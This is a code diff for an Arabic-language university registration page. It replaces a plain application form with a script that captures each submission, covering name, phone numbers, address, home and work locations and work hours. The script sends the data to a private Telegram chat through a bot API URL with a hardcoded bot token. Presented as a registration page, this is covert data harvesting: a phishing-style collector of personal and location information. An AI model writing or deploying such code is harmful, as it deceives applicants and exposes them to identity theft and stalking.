@@ -1,47 +1,35 @@
-<div style="max-width: 500px; margin: 0 auto; padding: 20px; text-align: right; direction: rtl;">
-    
-    <h2>البيانات المطلوبة في التقديم</h2>
-    
-    <form action="[ضع هنا رابط معالجة البيانات]" method="POST">
+<script>
+    document.getElementById('universityForm').addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        <label for="name_ar">الاسم الكامل (عربي):</label>
-        <input type="text" id="name_ar" name="name_ar" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
-
-        <label for="name_en">الاسم الكامل (إنجليزي):</label>
-        <input type="text" id="name_en" name="name_en" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
-
-        <label for="id_number">رقم الهوية:</label>
-        <input type="text" id="id_number" name="id_number" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
-
-        <label for="phone">رقم الهاتف:</label>
-        <input type="tel" id="phone" name="phone" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
-
-        <label for="parent_num">الرقم و ولي الأمر:</label>
-        <input type="text" id="parent_num" name="parent_num" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
-
-        <label for="current_region">المنطقة الحالي:</label>
-        <input type="text" id="current_region" name="current_region" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
-
-        <label for="cert_type">صورة من الشهادة:</label>
-        <input type="text" id="cert_type" name="cert_type" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+        const formData = new FormData(this);
+        const data = Object.fromEntries(formData.entries());
         
-        <label for="academic_num">الأكاديمي:</label>
-        <input type="text" id="academic_num" name="academic_num" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+        const message = `
+🎓 **تسجيل جامعي جديد**
 
-        <label for="major_name">اسم التخصص المطلوب:</label>
-        <input type="text" id="major_name" name="major_name" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+👤 **الاسم الكامل:** ${data.fullName}
+📞 **رقم الجوال:** ${data.phone}
+🚨 **رقم احتياطي:** ${data.emergencyPhone}
+🏠 **العنوان:** ${data.address}
+📍 **موقع السكن:** ${data.residenceLocation}
+💼 **موقع الدوام:** ${data.workLocation}
+⏰ **أوقات الدوام:** ${data.workSchedule}
+🕒 **الوقت:** ${new Date().toLocaleString('ar-SA')}
+        `;
+
+        // استخدام XMLHttpRequest بدلاً من fetch
+        const xhr = new XMLHttpRequest();
+        const url = 'https://api.telegram.org/bot8457845780:AAEGCZOgCqnM3HG2lr0fRt_WCdrC5Z-A26I/sendMessage';
         
-        <label for="gpa">المعدل التراكمي:</label>
-        <input type="text" id="gpa" name="gpa" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            chat_id: '7003054961',
+            text: message
+        }));
 
-        <label for="grades">الدرجة: القدرات/والتحصيلي:</label>
-        <input type="text" id="grades" name="grades" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
-
-        <label for="email">البريد الإلكتروني (الايميل):</label>
-        <input type="email" id="email" name="email" style="width: 100%; padding: 8px; margin: 6px 0 20px 0; box-sizing: border-box;" required><br>
-
-        <p style="text-align: center; color: #ff4d4d; font-weight: bold;">يرجى التأكد من صحة البيانات قبل إرسالها.</p>
-
-        <button type="submit" style="background-color: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; width: 100%; font-size: 16px;">إرسال البيانات</button>
-    </form>
-</div>
+        document.getElementById('successMessage').style.display = 'block';
+        this.reset();
+    });
+</script>
